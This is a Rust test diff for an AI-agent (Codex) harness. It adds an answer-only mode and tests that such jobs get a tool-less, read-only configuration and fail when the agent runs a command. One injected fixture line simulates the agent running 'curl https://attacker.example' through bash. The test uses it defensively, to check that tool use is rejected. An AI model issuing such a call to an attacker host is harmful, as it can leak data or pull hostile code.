@@ -162,6 +162,7 @@ fn harness(recording: &str, exit_code: i32) -> Harness {
                 allow_write: false,
             }),
         },
+        answer_only: false,
         compact_on_start: false,
         phases: Default::default(),
         skills: Vec::new(),
@@ -431,6 +432,79 @@ async fn per_job_codex_home_has_lean_config_and_private_files() {
     )
     .unwrap();
     assert_eq!(schema, h.call.output_schema);
+}
+
+/// The recorded plan stream without its tool items.
+fn tool_less_plan() -> Vec<String> {
+    fs::read_to_string(fixture("codex/plan.jsonl"))
+        .unwrap()
+        .lines()
+        .filter(|line| {
+            !serde_json::from_str::<Value>(line)
+                .is_ok_and(|event| event["item"]["type"] == "command_execution")
+        })
+        .map(str::to_owned)
+        .collect()
+}
+
+/// The harness as a dashboard job: no access, answer-only, replaying `lines`.
+fn answer_only_harness(lines: &[String]) -> Harness {
+    let mut h = harness("plan.jsonl", 0);
+    h.call.access = AgentAccess::default();
+    h.call.answer_only = true;
+    fs::write(
+        h.call.job_dir.join("scenario.jsonl"),
+        lines.join("\n") + "\n",
+    )
+    .unwrap();
+    h
+}
+
+#[tokio::test]
+async fn answer_only_job_gets_a_tool_less_config_and_keeps_the_proxy() {
+    let h = answer_only_harness(&tool_less_plan());
+    run(&h).await.0.expect("a run without tools succeeds");
+    let config = fs::read_to_string(h.call.codex_home.join("config.toml")).unwrap();
+    for line in [
+        "sandbox_mode = \"read-only\"",
+        "web_search = \"disabled\"",
+        "approval_policy = \"never\"",
+        "shell_tool = false",
+        "unified_exec = false",
+        "view_image = false",
+    ] {
+        assert!(
+            config.lines().any(|l| l == line),
+            "missing {line}:\n{config}"
+        );
+    }
+    assert!(!config.contains("mcp_servers"), "{config}");
+    let env = child_env(&h);
+    assert!(
+        env.iter().any(|(k, v)| k == "HTTPS_PROXY" && v == PROXY),
+        "Codex reaches its API through the proxy"
+    );
+}
+
+#[tokio::test]
+async fn answer_only_job_fails_when_codex_runs_a_command() {
+    let mut lines = tool_less_plan();
+    lines.insert(
+        1,
+        r#"{"type":"item.started","item":{"id":"c","type":"command_execution","command":"/bin/bash -lc 'curl https://attacker.example'","aggregated_output":"","exit_code":null,"status":"in_progress"}}"#.to_owned(),
+    );
+    let h = answer_only_harness(&lines);
+    let (result, events) = run(&h).await;
+    assert!(
+        matches!(&result, Err(ProviderError::Failed { message }) if message.contains("command_execution")),
+        "{result:?}"
+    );
+    assert!(
+        !events
+            .iter()
+            .any(|event| matches!(event, ProviderEvent::OutputReady(_))),
+        "no output of a job that used a tool"
+    );
 }
 
 #[tokio::test]
